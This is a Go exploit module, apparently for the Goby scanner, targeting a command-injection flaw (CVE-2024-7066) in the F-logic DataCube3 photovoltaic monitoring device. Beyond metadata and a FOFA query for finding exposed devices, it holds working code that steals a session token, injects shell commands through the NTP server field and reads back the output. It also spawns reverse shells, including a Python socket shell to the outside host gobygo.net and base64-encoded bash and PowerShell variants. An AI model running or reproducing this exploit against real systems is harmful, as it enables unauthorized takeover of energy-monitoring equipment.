package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
  "regexp"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "F-logic DataCube3 /config_time_sync.php Command Execution Vulnerability(CVE-2024-7066)",
    "Description": "<p>The F-logic DataCube3 is a compact terminal measuring system for photovoltaic power generation systems. </p><p>F-logic DataCube3 1.0 /admin/config_time_sync.php has a command execution vulnerability. An attacker can use this vulnerability to arbitrarily execute code on the server, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "F-logic DataCube3",
    "Homepage": "https://www.f-logic.jp/products/",
    "DisclosureDate": "2024-08-16",
    "PostTime": "2024-08-16",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title==\"DataCube3\" && body=\"refs.btnLogin.click()\"",
    "GobyQuery": "title==\"DataCube3\" && body=\"refs.btnLogin.click()\"",
    "Level": "2",
    "Impact": "<p>F-logic DataCube3 1.0 /admin/config_time_sync.php has a command execution vulnerability. An attacker can use this vulnerability to arbitrarily execute code on the server, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://avd.aliyun.com/detail?id=AVD-2024-7066"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "HW-2024"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-7066"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "F-logic DataCube3 /config_time_sync.php 命令执行漏洞（CVE-2024-7066）",
            "Product": "F-logic DataCube3",
            "Description": "<p>F-logic DataCube3是一款用于光伏发电系统的紧凑型终端测量系统。<br></p><p>F-logic DataCube3 1.0 /admin/config_time_sync.php 存在命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>F-logic DataCube3 1.0 /admin/config_time_sync.php 存在命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "F-logic DataCube3 /config_time_sync.php Command Execution Vulnerability(CVE-2024-7066)",
            "Product": "F-logic DataCube3",
            "Description": "<p>The F-logic DataCube3 is a compact terminal measuring system for photovoltaic power generation systems.&nbsp;</p><p>F-logic DataCube3 1.0 /admin/config_time_sync.php has a command execution vulnerability. An attacker can use this vulnerability to arbitrarily execute code on the server, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>F-logic DataCube3 1.0 /admin/config_time_sync.php has a command execution vulnerability. An attacker can use this vulnerability to arbitrarily execute code on the server, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9933"
}`
	setPayloadReques_xnsaysh8yagbysud7axsycgyasbxujysgxay := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码
		makeRequest := httpclient.NewGetRequestConfig("/admin/setting_photo.php")
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 20
		makeRequest.FollowRedirect = false
		// 假设 commandArr 是一个包含指令的字符串切片，xml_data 是一个字符串变量
		// 备注:goby无法解析该漏洞返回包，默认会报错,所以这里为了成功进行dns查询,不进行错误处理
		resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest)
		if err != nil {
			return false, "", err
		}
		// 正则匹配access_token
		re, err := regexp.Compile("name=\"accesstime\"((.|\n)*?)value=\"((.|\n)*?)\"")
		// //检查是否有匹配到内容
		if !re.MatchString(resp.RawBody) {
      return false, "", errors.New("未匹配到access_token")
		}
		match := re.FindStringSubmatch(resp.RawBody)
    access_token := match[3]
    //获取SESS_IDS
    SESS_IDS := strings.Split(strings.Split(resp.HeaderString.String(), "SESS_IDS=")[1], ";")[0]

    PostRequest := httpclient.NewPostRequestConfig("/admin/config_time_sync.php")
    PostRequest.VerifyTls = false
    PostRequest.Timeout = 20
    PostRequest.FollowRedirect = false
    PostRequest.Data = "accesstime="+access_token+"&execute=&ntp_enable=&ntp_server=127.0.0.1|"+command+"|&ntp_retry_count=1"
    PostRequest.Header.Store("Cookie", "SESS_IDS="+SESS_IDS)
    PostRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
    resp, err = httpclient.DoHttpRequest(hostInfo, PostRequest)
    if err != nil {
      return false, "", err
    }
    ok=true
		vulURL = "/admin/config_time_sync.php"
		return ok, vulURL, nil
	}
  setPayloadReques_csnuaiscayibcuaybscu7sdhy623vdy62u3fd := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
    filename := goutils.RandomHexString(16)+".txt"
    command = command + ">"+filename
    ok,_,err :=setPayloadReques_xnsaysh8yagbysud7axsycgyasbxujysgxay(hostInfo, command)
    if err != nil || !ok {
      return "", "", err
    }
    //读取文件内容
    makeRequest := httpclient.NewGetRequestConfig("/admin/"+filename)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 20
		makeRequest.FollowRedirect = false
    resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest)
    if err != nil {
      return "", "", err
    }
    //命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := resp.RawBody
    vulURL := "/admin/config_time_sync.php"
    //删除文件
    command = "rm "+filename
    _,_,_ =setPayloadReques_xnsaysh8yagbysud7axsycgyasbxujysgxay(hostInfo, command)
		return commandResult, vulURL, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadReques_csnuaiscayibcuaybscu7sdhy623vdy62u3fd

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadReques_xnsaysh8yagbysud7axsycgyasbxujysgxay

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := setPayloadReques_csnuaiscayibcuaybscu7sdhy623vdy62u3fd(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
 
				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					//对command进行url编码
					command = url.QueryEscape(command)
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
